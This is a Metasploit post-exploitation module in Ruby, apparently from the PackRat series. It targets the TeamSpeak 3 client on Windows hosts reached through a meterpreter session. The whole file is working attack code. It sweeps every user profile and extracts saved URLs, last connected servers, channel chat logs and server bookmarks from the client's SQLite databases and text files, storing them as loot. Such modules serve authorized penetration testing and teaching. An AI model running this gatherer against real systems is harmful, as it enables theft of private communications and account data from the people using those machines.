##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  # this associative array defines the artifacts known to PackRat
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat
  ARTIFACTS =
    {
      application: 'teamspeak 3 client',
      app_category: 'VOIP',
      gatherable_artifacts: [
        {
          filetypes: 'urls',
          path: 'AppData',
          dir: 'TS3Client',
          artifact_file_name: 'urls.db',
          description: 'Saved URL links',
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports TS3's stored urls",
              sql_table: 'urls_table',
              sql_column: 'url, last_mentioned, mentioned_by'
            }
          ]
        },
        {
          filetypes: 'connections',
          path: 'AppData',
          dir: 'TS3Client',
          artifact_file_name: 'settings.db',
          description: 'Last Connected Server',
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports TS3 Client's last connected server",
              sql_table: 'Connecting',
              sql_column: 'timestamp, key, value'
            }
          ]
        },
        {
          filetypes: 'chat_logs',
          path: 'AppData',
          dir: 'TS3Client',
          artifact_file_name: 'channel.txt',
          description: 'Channel chat logs',
          credential_types: 'text'

        },
        {
          filetypes: 'server_bookmarks',
          path: 'AppData',
          dir: 'TS3Client',
          artifact_file_name: 'settings.db',
          description: 'Collects Saved Bookmarks column',
          credential_type: 'sqlite',
          sql_search: [
            sql_description: 'ProtobufItems Dump',
            sql_table: 'ProtobufItems',
            sql_column: 'value'
          ]
        }
      ]
    }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Teamspeak 3 client credential gatherer',
        'Description' => %q{
          PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.
          PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.
          Further details can be found in the module documentation.
          This is a module that searches for credentials stored on Teamspeak 3 Client in a windows remote host.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Jacob Tierney',
          'Kazuyoshi Maruta',
          'Daniel Hallsworth',
          'Barwar Salim M',
          'Z. Cliffe Schreuders' # http://z.cliffe.schreuders.org
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])
      ]
    )
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
    print_status("STORE_LOOT: #{datastore['STORE_LOOT']}")
    print_status("EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\n")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      run_packrat(userprofile, ARTIFACTS)
    end

    print_status 'PackRat credential sweep Completed'
  end
end
